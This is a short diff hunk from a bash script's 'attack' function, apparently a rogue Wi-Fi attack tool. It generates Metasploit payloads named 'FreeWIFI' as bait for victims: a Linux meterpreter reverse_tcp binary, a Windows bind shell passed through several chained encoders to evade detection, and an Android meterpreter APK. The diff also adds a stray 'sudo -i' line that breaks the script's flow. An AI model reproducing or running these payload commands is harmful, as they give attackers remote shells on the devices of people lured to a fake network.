@@ -2005,6 +2005,7 @@ function attack {
 	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
 
   # Generate payload for sites
+  sudo -i 
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$localip LPORT=404 -f elf > $DUMP_PATH/FreeWIFI.elf &> $ares_output_device
   msfvenom -p windows/shell_bind_tcp LHOST=$localip LPORT=404 -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o $DUMP_PATH//FreeWIFI.exe &> $ares_output_device
   msfvenom -p android/meterpreter/reverse_http LHOST=$localip LPORT=404 R > $DUMP_PATH/FreeWIFI.apk &> $ares_output_device
